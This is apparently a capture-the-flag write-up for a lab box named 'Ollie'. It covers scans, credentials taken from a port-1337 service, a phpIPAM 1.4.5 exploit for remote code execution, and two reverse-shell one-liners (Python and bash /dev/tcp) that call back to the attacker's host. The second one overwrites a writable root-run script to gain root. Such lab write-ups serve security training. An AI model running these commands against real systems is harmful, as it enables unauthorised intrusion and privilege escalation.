Feroxbuster scan
```shell
feroxbuster -u "http://10.10.143.226/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403
                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.143.226/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip, tar, conf, inc]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      325c http://10.10.143.226/immaolllieeboyyy => http://10.10.143.226/immaolllieeboyyy/
302      GET        0l        0w        0c http://10.10.143.226/ => http://10.10.143.226/index.php?page=login
301      GET        9l       28w      312c http://10.10.143.226/api => http://10.10.143.226/api/
200      GET        1l        4w       90c http://10.10.143.226/immaolllieeboyyy/index.htm
301      GET        9l       28w      312c http://10.10.143.226/app => http://10.10.143.226/app/
200      GET       33l      219w     1464c http://10.10.143.226/api/README
200      GET        0l        0w        0c http://10.10.143.226/config.php
200      GET       12l       55w      575c http://10.10.143.226/app/footer.php
200      GET       10l       28w      289c http://10.10.143.226/app/error.php
301      GET        9l       28w      312c http://10.10.143.226/css => http://10.10.143.226/css/
302      GET        0l        0w        0c http://10.10.143.226/app/json/section/subnets.php => http://10.10.143.226/index.php?page=login
200      GET      115l      231w     2102c http://10.10.143.226/css/slider.css
200      GET       22l      118w     3803c http://10.10.143.226/css/bootstrap/bootstrap-datetimepicker.min.css
200      GET        1l      118w     5571c http://10.10.143.226/css/bootstrap-table/bootstrap-table.min.css
200      GET       12l       54w     3009c http://10.10.143.226/css/images/userVader.png
200      GET        6l       34w     2403c http://10.10.143.226/css/images/blue-dot.png
200      GET       29l       78w     3831c http://10.10.143.226/css/images/sn-bg-dark.png
200      GET       27l       90w     1795c http://10.10.143.226/css/images/li-dns-dark.png
200      GET       26l       46w     1305c http://10.10.143.226/css/images/ul-li-bg-dark.png
200      GET        7l      323w    17080c http://10.10.143.226/css/jquery-ui/jquery-ui.css
200      GET        2l     1015w    20427c http://10.10.143.226/css/bootstrap/bootstrap-custom-dark.css
200      GET        4l       63w    27466c http://10.10.143.226/css/font-awesome/font-awesome.min.css
200      GET     2715l     5615w    46911c http://10.10.143.226/css/bootstrap/bootstrap-custom.css
200      GET       14l       75w     5278c http://10.10.143.226/css/images/bootstrap-colorpicker/hue.png
200      GET       16l       90w     6473c http://10.10.143.226/css/images/bootstrap-colorpicker/alpha-horizontal.png
200      GET       18l       87w     5826c http://10.10.143.226/css/images/bootstrap-colorpicker/alpha.png
200      GET       13l       74w     5008c http://10.10.143.226/css/images/bootstrap-colorpicker/hue-horizontal.png
200      GET       45l      211w    15744c http://10.10.143.226/css/images/bootstrap-colorpicker/saturation.png
200      GET      284l     1722w   146638c http://10.10.143.226/css/fonts/fa-solid-900.woff
200      GET     1565l     6563w   130761c http://10.10.143.226/css/fonts/fa-brands-400.eot
301      GET        9l       28w      319c http://10.10.143.226/app/folder => http://10.10.143.226/app/folder/
200      GET     2312l    72262w   624767c http://10.10.143.226/css/fonts/fa-solid-900.svg
301      GET        9l       28w      322c http://10.10.143.226/app/dashboard => http://10.10.143.226/app/dashboard/
301      GET        9l       28w      318c http://10.10.143.226/app/admin => http://10.10.143.226/app/admin/
301      GET        9l       28w      313c http://10.10.143.226/imgs => http://10.10.143.226/imgs/
302      GET        0l        0w        0c http://10.10.143.226/index.php => http://10.10.143.226/index.php?page=login
301      GET        9l       28w      319c http://10.10.143.226/javascript => http://10.10.143.226/javascript/
301      GET        9l       28w      311c http://10.10.143.226/js => http://10.10.143.226/js/
301      GET        9l       28w      318c http://10.10.143.226/app/tools => http://10.10.143.226/app/tools/
200      GET        7l      432w    37045c http://10.10.143.226/js/bootstrap.min.js
301      GET        9l       28w      322c http://10.10.143.226/app/admin/api => http://10.10.143.226/app/admin/api/
301      GET        9l       28w      316c http://10.10.143.226/app/vrf => http://10.10.143.226/app/vrf/
301      GET        9l       28w      318c http://10.10.143.226/app/login => http://10.10.143.226/app/login/
301      GET        9l       28w      323c http://10.10.143.226/app/temp_share => http://10.10.143.226/app/temp_share/
301      GET        9l       28w      320c http://10.10.143.226/app/upgrade => http://10.10.143.226/app/upgrade/
200      GET        0l        0w        0c http://10.10.143.226/imgs/index.htm
[####################] - 3m    813078/813078  0s      found:46      errors:74674  
[####################] - 2m     42723/42723   472/s   http://10.10.143.226/ 
[####################] - 86s    42723/42723   498/s   http://10.10.143.226/immaolllieeboyyy/ 
[####################] - 66s    42723/42723   646/s   http://10.10.143.226/api/ 
[####################] - 6s     42723/42723   6606/s  http://10.10.143.226/app/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 78s    42723/42723   549/s   http://10.10.143.226/app/folder/ 
[####################] - 56s    42723/42723   764/s   http://10.10.143.226/app/login/ 
[####################] - 51s    42723/42723   834/s   http://10.10.143.226/app/admin/ 
[####################] - 2m     42723/42723   317/s   http://10.10.143.226/app/temp_share/ 
[####################] - 51s    42723/42723   842/s   http://10.10.143.226/app/vrf/ 
[####################] - 51s    42723/42723   839/s   http://10.10.143.226/app/sections/ 
[####################] - 65s    42723/42723   659/s   http://10.10.143.226/app/dashboard/ 
[####################] - 2m     42723/42723   334/s   http://10.10.143.226/app/vlan/ 
[####################] - 50s    42723/42723   859/s   http://10.10.143.226/app/saml2/ 
[####################] - 80s    42723/42723   531/s   http://10.10.143.226/app/subnets/ 
[####################] - 51s    42723/42723   839/s   http://10.10.143.226/app/tools/ 
[####################] - 50s    42723/42723   854/s   http://10.10.143.226/app/install/ 
[####################] - 0s     42723/42723   181800/s http://10.10.143.226/app/json/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m     42723/42723   334/s   http://10.10.143.226/app/upgrade/ 
[####################] - 0s     42723/42723   180266/s http://10.10.143.226/app/json/section/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     42723/42723   143366/s http://10.10.143.226/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     42723/42723   5997/s  http://10.10.143.226/css/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     42723/42723   114847/s http://10.10.143.226/css/font-awesome/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s     42723/42723   6002/s  http://10.10.143.226/css/bootstrap/ => Directory listing (add --scan-dir-listings to scan)
```
nmap scan
```shell
map -A -T4 -p- 10.10.143.226
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 12:24 GMT
Nmap scan report for 10.10.143.226
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:8a:cb:62:9b:7b:6e:9f:00:23:0f:4c:4b:3f:b6:37 (RSA)
|   256 47:07:00:35:43:7b:0d:4c:3e:95:8d:ee:b7:5c:cd:c9 (ECDSA)
|_  256 d3:42:7d:70:8e:68:81:b4:be:aa:cd:6b:fb:c4:1e:25 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
| http-title: Ollie :: login
|_Requested resource was http://10.10.143.226/index.php?page=login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.95%I=7%D=11/8%Time=690F37BD%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Aggressive OS guesses: Linux 4.15 (99%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Linux 5.0 - 5.14 (94%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Android 10 - 12 (Linux 4.14 - 4.19) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: ip-10-10-143-226.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   115.50 ms 10.11.0.1
2   115.54 ms 10.10.143.226

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 487.81 seconds
```
interesting port 1337 try to connect
```shell
 nc 10.10.131.185 1337
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? Ollie
What's up, Ollie! It's been a while. What are you here for? exploit
Ya' know what? Ollie. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!
```
we have password and login, try to go in 
![[Pasted image 20251109190528.png]]
we have phpIPAM admin panel and v1.4.5 phpPAM try to find explot
![[Pasted image 20251109190710.png]]
now use this 
```shell
python3 50963.py -url "http://10.10.131.185" -usr admin -pwd OllieUnixMontgomery!  --path /var/www/html --shell  

█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄

█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄

[...] Trying to log in as admin
[+] Login successful!
[...] Exploiting
Shell> 
```
make reverce shell 
```shell
Shell> export RHOST="10.11.147.65";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
```shell
nc -lvnp 9000         
listening on [any] 9000 ...
connect to [10.11.147.65] from (UNKNOWN) [10.10.131.185] 57116
```
and we are in, try to read user flag
```shell
www-data@ip-10-10-131-185:/home/ollie$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```
we cant, use a pasword for admin here for ollie user and
```shell
www-data@ip-10-10-131-185:/home/ollie$ su ollie
su ollie
Password: OllieUnixMontgomery!

ollie@ip-10-10-131-185:~$ cd /home/ollie
cd /home/ollie
ollie@ip-10-10-131-185:~$ ls -la
ls -la
total 36
drwxr-xr-x 5 ollie ollie 4096 Feb 10  2022 .
drwxr-xr-x 4 root  root  4096 Nov  9 09:05 ..
lrwxrwxrwx 1 root  root     9 Feb  6  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ollie ollie  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ollie ollie 3771 Feb 25  2020 .bashrc
drwx------ 2 ollie ollie 4096 Feb  6  2022 .cache
drwxrwxr-x 3 ollie ollie 4096 Feb  6  2022 .config
drwxrwxr-x 3 ollie ollie 4096 Feb  6  2022 .local
-rw-r--r-- 1 ollie ollie  807 Feb 25  2020 .profile
-rw-r--r-- 1 ollie ollie    0 Feb 10  2022 .sudo_as_admin_successful
-r-x------ 1 ollie ollie   29 Feb 10  2022 user.txt
ollie@ip-10-10-131-185:~$ cat user.txt
cat user.txt
THM{Ollie_boi_is_daH_Cut3st}
```
and have a first flag, next step root, linpeas dont give any useful information, i tried ro check pspy64 to find process 
i find `feedme`
```shell
ollie@ip-10-10-116-127:/home$ ls -la /usr/bin/feedme
-rwxrw-r-- 1 root ollie 30 Feb 12  2022 /usr/bin/feedme
```
we can write, use this bash `bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"` and we will be a root(i tried without reverse shell but it doesnt working)
```shell
echo '#!/bin/bash
bash -i >& /dev/tcp/10.11.147.65/9001 0>&1' > /usr/bin/feedme
```
ad we are root:
```shell
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.11.147.65] from (UNKNOWN) [10.10.116.127] 59194
bash: cannot set terminal process group (1813): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-116-127:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
